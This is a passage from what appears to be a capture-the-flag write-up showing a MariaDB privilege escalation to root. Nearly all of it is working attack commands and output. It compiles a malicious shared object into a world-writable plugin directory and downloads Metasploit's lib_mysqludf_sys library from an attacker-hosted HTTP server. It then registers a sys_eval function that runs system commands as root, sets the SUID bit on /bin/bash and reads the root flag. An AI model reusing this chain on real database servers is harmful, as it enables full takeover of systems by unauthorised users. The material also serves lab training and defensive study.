| Grants for admin@localhost                                                                                                                     |
+------------------------------------------------------------------------------------------------------------------------------------------------+
| GRANT SELECT, INSERT, UPDATE, DELETE, EXECUTE ON *.* TO `admin`@`localhost` IDENTIFIED BY PASSWORD '*6B77115C352F8F98A4DD4D3401F18E19D88FC7FC' |
+------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```
``` bash
MariaDB [(none)]> select @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
1 row in set (0.000 sec)
```
``` bash
ls -la /usr/lib/mysql/ | grep plugin
drwxr-xrwx 1 root root 4096 Feb 26  2025 plugin
```
``` bash
echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' | gcc -w -fPIC -shared -o /usr/lib/mysql/plugin/lib.so -x c -
```
The directory plugin is bad configured letting the user to upload a malicious .so
``` bash
cd /usr/share/metasploit-framework/data/exploits/mysql && python3 -m http.server 3000
Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
```
``` bash
wget http://172.17.0.1:3000/lib_mysqludf_sys_64.so
--2026-10-15 04:24:24--  http://172.17.0.1:3000/lib_mysqludf_sys_64.so
Connecting to 172.17.0.1:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8040 (7.9K) [application/octet-stream]
Saving to: ‘lib_mysqludf_sys_64.so’

lib_mysqludf_sys_64.so                                        100%[================================================================================================================================================>]   7.85K  --.-KB/s    in 0.003s

2026-10-15 04:24:24 (2.23 MB/s) - ‘lib_mysqludf_sys_64.so’ saved [8040/8040]
```
``` bash
mv lib_mysqludf_sys_64.so /usr/lib/mysql/plugin/lib.so
```
``` bash
mysql -u admin -p
MariaDB [(none)]> CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib.so';
Query OK, 0 rows affected (0.004 sec)
```
``` bash
MariaDB [(none)]> select sys_eval('id');
+----------------------------------------+
| sys_eval('id')                         |
+----------------------------------------+
| uid=0(root) gid=0(root) groups=0(root) |
+----------------------------------------+
1 row in set (0.002 sec)
```
# Root
``` bash
MariaDB [(none)]> select sys_eval('chmod 4755 /bin/bash');
+----------------------------------+
| sys_eval('chmod 4755 /bin/bash') |
+----------------------------------+
| NULL                             |
+----------------------------------+
1 row in set (0.034 sec)
```
``` bash
/bin/bash -p
whoami
root
```
``` bash
cat root.txt
d5a28ab3b2fe6d8191eb01fc3a76f5cb
```
